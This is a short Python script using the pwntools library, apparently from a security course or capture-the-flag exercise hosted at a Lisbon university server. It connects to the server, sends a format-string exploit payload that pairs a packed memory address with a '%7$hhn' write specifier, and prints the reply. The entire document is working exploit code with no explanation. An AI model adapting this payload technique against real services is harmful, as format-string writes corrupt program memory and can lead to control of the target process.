from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22194

s = remote(SERVER, PORT, timeout=9999)

s.sendline(b'\x47\xa0\x04\x08.%7$hhn')
print(s.recv(512))